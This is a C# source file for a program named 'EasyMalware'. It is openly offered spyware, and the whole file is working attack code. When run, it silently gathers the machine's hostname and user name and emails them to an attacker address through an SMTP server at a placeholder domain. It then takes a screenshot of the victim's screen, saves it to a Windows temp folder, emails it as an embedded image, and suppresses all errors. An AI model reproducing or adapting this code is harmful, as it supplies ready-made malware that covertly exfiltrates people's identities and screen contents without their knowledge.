using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EasyMalware
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            string HostName = Dns.GetHostName();
            string userName = Environment.UserName;
            try
            {
                MailMessage message = new MailMessage();
                SmtpClient smtp = new SmtpClient();
                message.From = new MailAddress("attackerNotifications@yourdomain.com", "Run malware - Notifications");
                message.To.Add(new MailAddress("attacker@yourdomain.com"));
                message.Subject = "Malware executed";
                message.Body = "Hostname: " + HostName + " User: " + userName;
                smtp.Port = 587;
                smtp.Host = "smtp.yourdomain.com";
                smtp.EnableSsl = true;
                smtp.UseDefaultCredentials = false;
                smtp.Credentials = new NetworkCredential("attackerNotifications@yourdomain.com", "Password");
                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtp.Send(message);
            }
            catch (Exception) { }

            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save("C:\\Windows\\Temp\\screenshot.jpeg", ImageFormat.Jpeg);

            try
            {
                MailMessage message = new MailMessage();
                SmtpClient smtp = new SmtpClient();
                message.From = new MailAddress("attackerNotifications@yourdomain.com", "Malware - Notifications");
                message.To.Add(new MailAddress("attacker@yourdomain.com"));
                message.Subject = "Screenshot from " + userName;

                string htmlMessage = @"<html>
                         <body>
                         <img src='cid:EmbeddedContent_1' />
                         </body>
                         </html>";
                // Create the HTML view
                AlternateView htmlView = AlternateView.CreateAlternateViewFromString(
                                                             htmlMessage,
                                                             Encoding.UTF8,
                                                             MediaTypeNames.Text.Html);
                // Create a plain text message for client that don't support HTML
                AlternateView plainView = AlternateView.CreateAlternateViewFromString(
                                                            Regex.Replace(htmlMessage,
                                                                          "<[^>]+?>",
                                                                          string.Empty),
                                                            Encoding.UTF8,
                                                            MediaTypeNames.Text.Plain);
                string mediaType = MediaTypeNames.Image.Jpeg;
                LinkedResource img = new LinkedResource(@"C:\\Windows\\Temp\\screenshot.jpeg", mediaType);
                // Make sure you set all these values!!!
                img.ContentId = "EmbeddedContent_1";
                img.ContentType.MediaType = mediaType;
                img.TransferEncoding = TransferEncoding.Base64;
                img.ContentType.Name = img.ContentId;
                img.ContentLink = new Uri("cid:" + img.ContentId);
                htmlView.LinkedResources.Add(img);
                //////////////////////////////////////////////////////////////
                message.AlternateViews.Add(plainView);
                message.AlternateViews.Add(htmlView);
                message.IsBodyHtml = true;
                smtp.Port = 587;
                smtp.Host = "smtp.yourdomain.com";
                smtp.EnableSsl = true;
                smtp.UseDefaultCredentials = false;
                smtp.Credentials = new NetworkCredential("attackermail@yourdomain.com", "Password");
                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtp.Send(message);
            }
            catch (Exception) { }


        }
    }
}
